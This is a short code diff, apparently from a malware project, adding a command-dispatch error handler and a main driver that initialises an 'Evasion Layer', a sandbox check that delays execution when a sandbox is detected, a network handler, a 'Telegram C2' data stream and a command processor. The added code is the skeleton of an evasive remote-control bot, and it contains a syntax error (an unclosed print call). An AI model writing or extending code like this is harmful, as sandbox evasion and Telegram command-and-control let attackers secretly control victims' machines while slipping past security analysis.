@@ -798,3 +798,31 @@ class CmdParser:
                     return func(*args)
                 else:
                     return func()
+            except Exception as e:
+                return f"Error executing command: {str(e)}"
+        else:
+            return f"Unknown command. Available: {', '.join(self._parser.keys())}"
+            
+
+# --- Main Application Driver ---
+
+def pv01_initialize():
+    """Intializer core modules and starts the main loop."""
+    try:
+        # 1. Evasion Layer
+        enc = Enclayer()
+        if not pv01_validate_memory():
+            print("Detected sandbox environment. Delaying execution..."
+            pv01_random_sleep(30, 60)
+            
+        # 2. Core Logic
+        logic = Logicnode()
+        
+        # 3. Networking
+        net = NetHandler()
+        
+        # 4. Telegram C2
+        stream = Datastream()
+        
+        # 5. Command Processor
+        processor = CmdParser()
